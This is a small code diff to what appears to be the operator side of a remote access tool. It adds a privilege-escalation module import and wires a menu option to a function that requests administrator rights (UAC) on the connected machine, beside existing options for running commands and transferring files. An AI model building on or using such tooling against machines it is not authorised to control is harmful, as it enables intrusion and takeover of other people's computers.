@@ -1,5 +1,6 @@
 from core.features.command import run_command, run_command_advanced
 from core.features.trasfer_files import *
+from core.features.privilage import *
 
 
 def show_options():
@@ -38,6 +39,7 @@ def handleConnection(my_socket):
 
         elif user_option == "5":
             print("\t\t[+] Escalate privilages")
+            request_admin_UAC(my_socket)
 
         elif user_option == "6":
             print("\t\t[+] Running Command Advanced mode")
